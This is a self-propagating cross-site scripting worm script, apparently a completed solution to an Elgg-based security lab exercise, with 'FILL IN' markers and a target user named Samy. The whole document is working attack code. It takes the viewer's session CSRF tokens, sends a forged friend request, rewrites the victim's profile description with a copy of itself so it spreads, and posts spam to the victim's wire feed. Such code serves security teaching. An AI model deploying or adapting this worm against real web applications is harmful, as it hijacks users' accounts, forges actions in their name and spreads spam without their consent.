<script type="text/javascript" id="worm">
	//alert(jsCode);

	window.onload = function () 
	{
		var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
		var jsCode = document.getElementById("worm").innerHTML;
		var tailTag = "</" + "script>";
		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

		var Ajax=null;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		
		//Construct the HTTP request to add Samy as a friend.

		var ownerID = elgg.session.user.guid;

		var samyID = 47;

		if(samyID != ownerID)
		{
			// var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend="+ samyID + ts +  token +  ts +  token; //FILL IN
			var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend="+ samyID + token + ts; //FILL IN

			//Create and send Ajax request to add friend
			Ajax=new XMLHttpRequest();
			Ajax.open("GET",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send();
		}




		var name = "&name=" + elgg.session.user.name;

		var sendurl = "http://www.xsslabelgg.com/action/profile/edit"; //FILL IN

		var content = "";

		content += token + ts + name;

		
		content += "&description=" + wormCode;
	
		content += "&guid=" + ownerID;
		
		//content += "__elgg_token"
		
		if(ownerID != samyID)
		{
			//Create and send Ajax request to modify profile
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(content);
		}





		var sendurl = "http://www.xsslabelgg.com/action/thewire/add"; //FILL IN

		var content = ""

		content += token + ts 

		content += "&body=To earn 12 USD/Hour(!), visit now " + "http://www.xsslabelgg.com/profile/samy";
		
		if(ownerID != samyID)
		{
			//Create and send Ajax request to modify profile
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(content);
		}

	}
	
</script>